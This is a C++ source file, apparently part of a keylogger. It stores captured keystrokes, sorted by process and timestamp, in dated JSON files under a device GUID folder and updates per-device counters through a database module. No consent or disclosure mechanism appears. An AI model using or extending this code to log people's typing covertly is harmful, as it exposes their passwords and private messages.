#include "JsonLog.h"
#include "Utils.h"
#include "UnicodeUtils.h"
#include "DBcommunication.h"
#include "json.hpp"
#include <fstream>
#include <iomanip>
#include <direct.h>

using json = nlohmann::json;

void createNestedFolders(const std::string& path) {
    size_t pos = 0;
    std::string current;
    while ((pos = path.find('\\', pos)) != std::string::npos) {
        current = path.substr(0, pos);
        if (!current.empty()) _mkdir(current.c_str());
        pos++;
    }
    _mkdir(path.c_str());
}

void WriteKeystrokeToJson(const std::wstring& process, const std::wstring& text, std::time_t timestamp) {
    std::string deviceFolder = getDeviceGUID();
    std::string date = getCurrentDate();
    std::string dateFolder = deviceFolder + "\\" + date;
    createNestedFolders(dateFolder);
    std::string filePath = dateFolder + "\\" + date + ".json";
    
    json j;
    std::ifstream in(filePath);
    if (in) {
        try {
            in >> j;
        } catch (const std::exception& e) {
            // If JSON parsing fails, start with empty object
            j = json::object();
        }
        in.close();
    }
    else {
        // If file doesn't exist, start with empty object
        j = json::object();
    }
    
    try {
        // Use the improved Unicode conversion
        std::string processUtf8 = UnicodeUtils::SafeWStringToUTF8(process);
        std::string textUtf8 = UnicodeUtils::SafeWStringToUTF8(text);
        
        // Ensure we have valid UTF-8 strings
        if (!processUtf8.empty() && !textUtf8.empty()) {
            j[processUtf8][std::to_string(timestamp)] = textUtf8;
            
            std::ofstream out(filePath);
            if (out) {
                out << std::setw(2) << j << std::endl;
            }

            // Increment devices/{GUID}/totalSequences by 1 for each recorded sequence
            IncrementDeviceCounter("totalSequences", 1);
            // Increment daily counter devices/{GUID}/todaySequences and reset per day by tracking devices/{GUID}/todayDate
            IncrementDeviceDailyCounter("todaySequences", "todayDate", 1);
        }
    }
    catch (const std::exception& e) {
        // Log error or handle gracefully - for now just ignore
        // Could optionally write to a debug log file
    }
}
